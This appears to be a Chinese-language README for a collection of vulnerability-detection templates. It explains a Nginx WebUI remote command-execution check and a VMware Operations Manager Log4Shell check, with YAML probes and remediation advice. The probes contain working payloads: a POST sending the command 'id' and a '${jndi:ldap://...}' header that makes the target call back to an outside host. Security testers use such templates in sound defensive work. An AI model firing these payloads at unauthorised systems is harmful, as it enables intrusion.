# 大厂厂商平台安全模板分类说明

本目录聚焦于各类大型厂商自研或广泛部署的管理平台、运维系统等的安全风险，涵盖远程代码执行、未授权访问、信息泄露等典型漏洞，帮助安全测试人员快速定位和验证相关风险。

---

## 典型漏洞模板举例

### Nginx WebUI 远程命令执行漏洞

**模板文件**：`nginx-webui-rce.yaml`

#### 漏洞简介

Nginx WebUI 是一款常见的 Nginx 可视化管理面板。部分版本存在远程命令执行漏洞，攻击者可通过特定接口传入恶意命令，无需认证即可在服务器上执行任意系统命令，危害极大。

#### 漏洞原理

该漏洞源于 WebUI 后台接口对用户输入的命令参数缺乏有效校验和权限控制。攻击者可直接向相关接口（如 `/admin/api/nginx/reload` 或 `/admin/api/nginx/exec`）提交包含恶意命令的请求，服务端未做过滤直接执行，导致远程命令执行。

#### 检测逻辑（YAML内容解析）

```yaml
id: nginx-webui-rce

http:
  - method: POST
    path:
      - "/admin/api/nginx/exec"
    headers:
      Content-Type: application/json
    body: |
      {
        "command": "id"
      }
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
```

- 发送包含系统命令（如 `id`）的 POST 请求到命令执行接口。
- 若响应体中出现 `uid=`、`gid=` 等系统命令输出，则判定存在远程命令执行漏洞。

#### 防护建议

- 升级 Nginx WebUI 至官方修复版本。
- 对命令执行接口添加严格的认证和权限校验。
- 对用户输入进行严格校验，禁止拼接和执行外部命令。

---

### VMware Operation Manager Log4j 远程代码执行漏洞

**模板文件**：`vmware-operation-manager-log4j.yaml`

#### 漏洞简介

VMware Operation Manager 集成了受影响版本的 Apache Log4j 组件，存在 JNDI 注入导致远程代码执行（Log4Shell，CVE-2021-44228）风险。攻击者可通过构造恶意请求，在无需认证的情况下远程执行任意命令，危害极大。

#### 漏洞原理

Log4j 在处理日志消息时，如果日志内容中包含 `${jndi:ldap://...}` 这样的字符串，会自动发起远程请求并加载恶意类，导致远程代码执行。攻击者可将 JNDI payload 注入到如 User-Agent、X-Api-Version 等 HTTP 头部，触发漏洞。

#### 检测逻辑（YAML内容解析）

```yaml
id: vmware-operation-manager-log4j

http:
  - method: GET
    path:
      - "/"
    headers:
      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "ldap"
```

- 发送带有 JNDI payload 的请求到 Operation Manager 接口。
- 通过 OOB（如 interactsh）检测是否有 LDAP 请求回连，判定目标存在该漏洞。

#### 防护建议

- 升级 VMware Operation Manager 及其依赖的 Log4j 组件至官方修复版本。
- 禁用 Log4j 的 JNDI 功能，或限制其加载远程类的能力。
- 对所有用户输入进行严格校验，避免日志记录敏感或可控内容。

---